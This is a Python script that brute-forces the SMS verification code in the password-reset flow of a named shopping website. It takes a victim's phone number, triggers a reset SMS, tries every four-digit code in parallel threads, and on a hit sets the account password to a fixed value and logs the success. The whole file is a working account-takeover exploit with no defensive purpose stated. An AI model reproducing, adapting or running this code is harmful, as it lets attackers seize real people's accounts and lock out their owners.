#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150322


import json
import random
import requests
import threadpool as tp
import sys
from BeautifulSoup import BeautifulSoup 
import types


global phone,cookie,formhash


def forgetpassword(phone):
    cookies = {'PHPSESSID':cookie}
    headers = {'content-type':'application/x-www-form-urlencoded',
               'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
               'Referer':'http://mall.dding.net/ucenter/forget',
        }
    api_url = 'http://mall.dding.net/ucenter/forget'
    try:
        req_g = requests.get(api_url,headers=headers,cookies = cookies,timeout=3)
        html = req_g.text
        soup=BeautifulSoup(html)
        formhash = soup.find('input',attrs = {'name':"formhash"})["value"]
        print "formhash:%s" % formhash
        data = {'cellphone':phone,
        'formhash':formhash,
        }
        req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
        req_status = req.status_code
        print "phone:%s sms code send" % phone[:8]
        return formhash
    except:
        req_status = 500
    #if req_status == 302:
        #print "phone:%s sms code send" % phone[:8]
        
    #elif req_status == 200:
    #    print "faild send sms code at phone:%s,cookie:%s" % (phone[:8],cookie)
    #    sys.exit(1)


def step(args):
    key = args
    password="12345600"
    data2 = {'valicode':key,
    'formhash':formhash,
    }
    cookies = {'PHPSESSID':cookie}
    headers2 = {'content-type':'application/x-www-form-urlencoded',
                    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
                    'Referer':'http://mall.dding.net/ucenter/forget/step2',
        }
    api_url2 = 'http://mall.dding.net/ucenter/forget/step2'
    try:
        req = requests.post(api_url2, data=data2, headers=headers2,cookies = cookies,timeout=3)
        req_status = req.status_code
        #print "move the step3" 
        data3 = {'password':password,
        'repassword':password,
        'formhash':formhash,
        }
        headers3 = {'content-type':'application/x-www-form-urlencoded',
                    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
                    'Referer':'http://mall.dding.net/ucenter/forget/step3',
        }
        api_url3 = 'http://mall.dding.net/ucenter/forget/step3'
        try:
            req = requests.post(api_url3, data=data3, headers=headers3,cookies = cookies,timeout=3)
            req_status = req.status_code
            html = req.text
            soup=BeautifulSoup(html)
            #<div class="alert alert-danger">failed for this action</div>
            result = soup.find('div',attrs = {'class':"alert alert-danger"})

            if type(result) is types.NoneType:
                print "phone done:%s,password:%s" % (phone,password)
                burp_succ = open('./web_succ.txt', 'a+')
                burp_succ.write('[-] Burp succ log:%s,code:%s\n'%(req_status,key))
                burp_succ.close()
                sys.exit(1)
            else:
                burp_fail = open('./web_log.txt', 'a+')
                burp_fail.write('[-] Burp False log:%s,code:%s\n'%(req_status,key))
                burp_fail.close()    
            
        except requests.RequestException as e:
            req_status = 500
            print "error at step3:%s,key:%s" % (e,key)
    except requests.RequestException as e:
        req_status = 500
        print "error at step2:%s,key:%s" % (e,key)


def get_cookie():
    api_url = 'http://mall.dding.net/'
    try:
        req = requests.get(api_url,timeout=3)
        req_status = req.status_code
        cook = req.cookies['PHPSESSID']
    except:
        req_status = 500
        sys.exit(1)
    if req_status == 200:
        print "get cookie:%s" % cook
        return cook

if __name__ == '__main__':
    args = []
    if len(sys.argv) != 2:
        print "usage: %s phone" % sys.argv[0]
        sys.exit(1)
    cookie=get_cookie()
    phone = sys.argv[1]
    formhash=forgetpassword(phone)
    for i in range(1000,9999):
        args.append(i)
    pool = tp.ThreadPool(3)
    reqs = tp.makeRequests(step, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
